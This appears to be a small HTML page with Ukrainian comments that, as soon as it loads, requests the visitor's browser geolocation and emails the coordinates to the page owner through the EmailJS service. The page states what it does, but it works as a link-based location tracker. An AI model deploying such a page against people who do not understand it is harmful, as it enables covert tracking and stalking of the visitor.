<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Send Location</title>
  <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
  <script>
    (function () {
      // Ініціалізація EmailJS
      emailjs.init('cordinantsss'); // Замініть your_user_id на ваш User ID із EmailJS
    })();

    function sendLocation() {
      if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(position => {
          const latitude = position.coords.latitude;
          const longitude = position.coords.longitude;

          // Дані для надсилання
          const templateParams = {
            latitude: latitude,
            longitude: longitude,
          };

          // Надсилання листа через EmailJS
          emailjs
            .send('service_ogjvqtm', 'template_revjutn', templateParams)
            .then(
              response => {
                alert("Координати успішно надіслані!");
              },
              error => {
                console.error("Помилка надсилання:", error);
                alert("Не вдалося надіслати координати.");
              }
            );
        });
      } else {
        alert("Ваш браузер не підтримує геолокацію.");
      }
    }

    // Виклик функції автоматично при завантаженні сторінки
    window.onload = sendLocation;
  </script>
</head>
<body>
  <h1>Визначення геолокації...</h1>
</body>
</html>
